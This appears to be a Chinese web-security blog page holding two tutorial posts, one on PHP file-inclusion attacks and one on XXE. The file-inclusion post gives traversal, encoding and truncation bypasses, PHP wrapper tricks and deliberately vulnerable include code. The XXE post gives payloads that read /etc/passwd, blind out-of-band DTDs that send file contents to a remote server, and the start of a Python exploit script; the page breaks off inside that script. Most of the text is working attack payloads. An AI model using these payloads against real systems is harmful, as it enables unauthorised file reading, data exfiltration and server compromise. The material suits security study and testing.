<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](<a href="https://www.insomniasec.com/downloads/publications/LFI" target="_blank" rel="noopener">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</p>
<p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN夏令营-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a></p>
<h2 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h2><p>利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p>
<p>姿势：</p>
<p>往往要配合上传的姿势，不说了，太多了。</p>
<h2 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h2><p>一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了</p>
<h2 id="绕过特定字符替换replace："><a href="#绕过特定字符替换replace：" class="headerlink" title="绕过特定字符替换replace："></a>绕过特定字符替换replace：</h2><p>就是将输入的url参数中包含的“http://”、“https://”,  “. . /“  ,  “. . &quot;“等字符串替换成空的字符串，</p>
<p>1.双写</p>
<p><code>http://192.168.217.133/dvwa/vulnerabilities/fi/?page=httphttp://://127.0.0.1/1.php</code></p>
<p>使用<code>..././..././..././..././..././..././..././</code> 绕过<code>../</code>的过滤</p>
<p>2.大小写</p>
<p>3.使用file协议绕过：</p>
<p><code>http://192.168.217.133/dvwa/vulnerabilities/fi/?page=file:///1.txt</code></p>
<p><code>http://192.168.217.133/dvwa/vulnerabilities/fi/?page=file://c://1.txt</code></p>
<h2 id="绕过php函数"><a href="#绕过php函数" class="headerlink" title="绕过php函数"></a>绕过php函数</h2><h3 id="file-get-contents（）"><a href="#file-get-contents（）" class="headerlink" title="file_get_contents（）"></a>file_get_contents（）</h3><p>而file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。</p>
<ul>
<li>可以使用php://input传过去 再用post构建其里面的内容</li>
</ul>
<ul>
<li>用data://伪协议绕过<pre><code>将url改为：?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码
或者将url改为：?xxx=data:text/plain,(url编码的内容)</code></pre></li>
</ul>
<p><strong>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</strong></p>
<p> 名称    描述<br>resource=&lt;要过滤的数据流&gt;       这个参数是必须的。它指定了你要筛选过滤的数据流。<br>read=&lt;读链的筛选列表&gt;           该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>write=&lt;写链的筛选列表&gt;       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>&lt;；两个链的筛选列表&gt;           任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。<br>php://filter/read=convert.base64-encode/resource=upload.php</p>
<h3 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h3><p>在include函数的使用上，经常会造成任意文件读取漏洞，</p>
<p>可以使用php://filter/read=convert.base64-encode/resource=文件名(如index.php) </p>
<p>也可以使用上述的方法 php://input传过去 再用post构建其里面的内容</p>
<h1 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h1><p>先考虑一下指定了前缀的情况吧。测试代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>这个最简单了，简要的提一下。</p>
<p>现在在/var/log/test.txt文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行目录遍历，比如我们尝试访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file&#x3D;..&#x2F;..&#x2F;log&#x2F;test.txt</span><br></pre></td></tr></table></figure>



<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</p>
<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/18.png?raw=true" alt="img"></a></p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
<ul>
<li>利用url编码<ul>
<li>../<ul>
<li>%2e%2e%2f</li>
<li>..%2f</li>
<li>%2e%2e/</li>
</ul>
</li>
<li>..\<ul>
<li>%2e%2e%5c</li>
<li>..%5c</li>
<li>%2e%2e\</li>
</ul>
</li>
</ul>
</li>
<li>二次编码<ul>
<li>../<ul>
<li>%252e%252e%252f</li>
</ul>
</li>
<li>..\<ul>
<li>%252e%252e%255c</li>
</ul>
</li>
</ul>
</li>
<li>容器/服务器的编码方式<ul>
<li>../<ul>
<li>..%c0%af<ul>
<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work?</a></li>
</ul>
</li>
<li>%c0%ae%c0%ae/<ul>
<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
<li>Apache Tomcat Directory Traversal</li>
</ul>
</li>
</ul>
</li>
<li>..\<ul>
<li>..%c1%9c</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h2><p>接着考虑指定后缀的情况。测试代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">	include $file.&#39;&#x2F;test&#x2F;test.php&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>url格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure>



<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
<p>姿势一：query（？）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt?</span><br></pre></td></tr></table></figure>



<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作query从而被绕过。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/19.png?raw=true" alt="img"></a></p>
<p>姿势二：fragment（#）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt%23</span><br></pre></td></tr></table></figure>



<p>则包含的文件为 <a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/20.png?raw=true" alt="img"></a></p>
<h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p>前面有提到过利用zip协议和phar协议。假设现在测试代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">	include $file.&#39;&#x2F;test&#x2F;test.php&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>构造压缩包如下：<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/21.png?raw=true" alt="img"></a></p>
<p>其中test.php内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>



<p>利用zip协议，注意要指定绝对路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;zip:&#x2F;&#x2F;D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</span><br></pre></td></tr></table></figure>



<p>则拼接后为：zip://D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta/test/test.php</p>
<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/22.png?raw=true" alt="img"></a></p>
<p>能成功包含。</p>
<p>在利用phar协议的时候有些问题。哪位能指教一下？<br><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/23.png?raw=true" alt="img"></a></p>
<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>利用条件： php版本 &lt; php 5.2.8</p>
<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;.&#x2F;.&#x2F;.&#x2F;.&#x2F;。。。省略。。。.&#x2F;.&#x2F;shell.txt</span><br></pre></td></tr></table></figure>



<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
<h3 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h3><p>利用条件： php版本 &lt; php 5.3.4</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file&#x3D;phpinfo.txt%00</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/24.png?raw=true" alt="img"></a></p>
<p>能利用00截断的场景现在应该很少了：）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/14/4%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="clmvmvoj100051s7k6d2h04w6" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-xxe" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/11/xxe/" class="article-date">
  <time datetime="2019-11-11T09:14:32.000Z" itemprop="datePublished">2019-11-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/11/xxe/">xxe</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p> XXE 可以使用例如 http，file 等协议， 在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。 </p>
<ul>
<li>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</li>
</ul>
<h4 id="有回显的payload写法："><a href="#有回显的payload写法：" class="headerlink" title="有回显的payload写法："></a>有回显的payload写法：</h4><p>直接通过dDTD外部实体声明。XML内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>通过DTD文档引入外部DTD文档，再引入外部实体声明。XML内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://localhost/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>evil.dtd内容：</p>
<p>​    <code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
<p>通过DTD外部实体声明引入外部实体声明。XML内容如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">​    &lt;!DOCTYPE a [</span><br><span class="line">​        &lt;!ENTITY %d SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">​    %d;</span><br><span class="line">​    ]&gt;</span><br><span class="line">​    &lt;abc&gt;&amp;b;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure>

<p> evil.dtd内容：</p>
<p>​    <code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
<p>但是如果想通过如下声明是不可以的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; </span><br><span class="line">​    &lt;!DOCTYPE a [</span><br><span class="line">​    &lt;!ENTITY d SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;evil.xml&quot;&gt;</span><br><span class="line">​    ]&gt;</span><br><span class="line">​    &lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure>

<p>测试发现这种实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，参数实体就好用很多。</p>
<h4 id="无回显的payload写法："><a href="#无回显的payload写法：" class="headerlink" title="无回显的payload写法："></a>无回显的payload写法：</h4><h5 id="第一种无回显示payload写法："><a href="#第一种无回显示payload写法：" class="headerlink" title="第一种无回显示payload写法："></a>第一种无回显示payload写法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?xml version&#x3D;&quot;1.0&quot;?&gt; </span><br><span class="line">​    &lt;!DOCTYPE a [</span><br><span class="line">​    &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;1.txt&quot;&gt;</span><br><span class="line">​    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;evil.xml&quot;&gt; </span><br><span class="line">​    %dtd; %all; </span><br><span class="line">​    ]&gt; </span><br><span class="line">​    &lt;abc&gt;&amp;send;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure>

<p>其中evil.xml文件内容为</p>
<p>​     <code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://localhost%file;&#39;&gt;&quot;&gt;</code></p>
<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。</p>
<h5 id="第二种无回显payload写法："><a href="#第二种无回显payload写法：" class="headerlink" title="第二种无回显payload写法："></a>第二种无回显payload写法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   &lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">​    &lt;!DOCTYPE a [</span><br><span class="line">​    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;test&#x2F;1.txt&quot;&gt;</span><br><span class="line">​    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;evil.xml&quot;&gt;</span><br><span class="line">​    %dtd;</span><br><span class="line">​    %send;</span><br><span class="line">​    ]&gt;</span><br><span class="line">​    &lt;abc&gt;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure>

<p>其中evil.xml文件内容为：</p>
<p>​    <code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;&quot;&gt; %payload;</code></p>
<p>调用过程和第一种方法类似，但最里层的嵌套里%要进行实体编码成%。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
<p>　　这里注意参数实体引用%file;必须放在外部文件里，因为根据这条 规则 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。这里的    internal subset指的是中括号[]内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。</p>
<p>一般都使用第二种方法，因为当文件中含有中文字符或&lt;字符，会导致不能解析</p>
<p>首先准备一个有XXE漏洞的文件，本次测试以php为主：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xml &#x3D; simplexml_load_string($_REQUEST[&#39;xml&#39;]);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot; ;</span><br><span class="line">print_r($xml);&#x2F;&#x2F;注释掉该语句即为无回显的情况</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="寻找XXE"><a href="#寻找XXE" class="headerlink" title="寻找XXE"></a><strong>寻找XXE</strong></h4><h5 id="检测xml是否被解析"><a href="#检测xml是否被解析" class="headerlink" title="检测xml是否被解析"></a>检测xml是否被解析</h5><p>　　尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p>
<ul>
<li>单双引号 ‘ “ ：XML的属性值必须用引号包裹，而数据可能进入标签的属性值。</li>
<li>尖括号&lt; &gt; ：XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。</li>
<li>注释符<!-- ：XML使用<!-- This is a comment -->作注释。</li>
<li>&amp; ：&amp; 用于引用实体。</li>
<li>CDATA 分隔符]]&gt; ：<code>&lt;![CDATA[     foo]]&gt;</code>中的内容不被解析器解析，提前闭合引发异常。</li>
</ul>
<h5 id="检测是否支持外部实体解析"><a href="#检测是否支持外部实体解析" class="headerlink" title="检测是否支持外部实体解析"></a>检测是否支持外部实体解析</h5><p>　　尝试利用实体和DTD。</p>
<ul>
<li><pre><code>- 引用外部DTD文件访问内网主机/端口 ：&lt;!DOCTYPE a SYSTEM &quot;http://127.0.0.1:2333&quot;&gt;（看响应时间）
- 引用外部DTD文件访问外网 ：&lt;!DOCTYPE a SYSTEM &quot;http://vps_ip&quot; &gt;
- 引用内部实体 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe     &quot;findneo&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
- 外部实体读本地文件 ：&lt;!DOCTYPE a     [&lt;!ENTITY xxe SYSTEM     &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
- 外部实体访问内网主机/端口 ：&lt;!DOCTYPE a SYSTEM &quot;http://192.168.1.2:80&quot;&gt;（看响应时间）
- 外部实体访问外网 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe     SYSTEM &quot;http://vps_ip&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
- 判断问题存在可以OOB提取数据。
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：</span><br><span class="line"></span><br><span class="line">####  file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;html</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe(实体引用名) SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;(实体内容) &gt;]&gt;</span><br><span class="line"> &lt;methodcall&gt;</span><br><span class="line"> &lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;</span><br><span class="line"> &lt;&#x2F;methodcall&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">	&lt;!ENTITY xxw SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxw;&lt;&#x2F;username&gt;&lt;password&gt;password&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
</code></pre></li>
</ul>
<h4 id="http-url"><a href="#http-url" class="headerlink" title="http://url"></a><code>http://url</code></h4><h4 id="php-filter-read-convert-base64-encode-resource-conf-php"><a href="#php-filter-read-convert-base64-encode-resource-conf-php" class="headerlink" title="php://filter/read=convert.base64-encode/resource=conf.php"></a>php://filter/read=convert.base64-encode/resource=conf.php</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=flag.php' &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>P4ssChen<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="恶意脚本"><a href="#恶意脚本" class="headerlink" title="恶意脚本:"></a>恶意脚本:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> <span class="string">u'输入要读取的文件，如file:///etc/passwd'</span></span><br><span class="line"></span><br><span class="line">  payload = raw_input()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> <span class="string">u'输入要访问的地址，如http://172.16.12.2/simplexml_load_string.php'</span></span><br><span class="line"></span><br><span class="line">  url = raw_input()</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#url = 'http://192.168.70.235/simplexml_load_string.php'</span></span><br><span class="line"></span><br><span class="line">  headers = &#123;<span class="string">'Content-type'</span>: <span class="string">'text/xml'</span>&#125;</span><br><span class="line"></span><br><span class="line">  xml = <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "'</span> + payload + <span class="string">'" 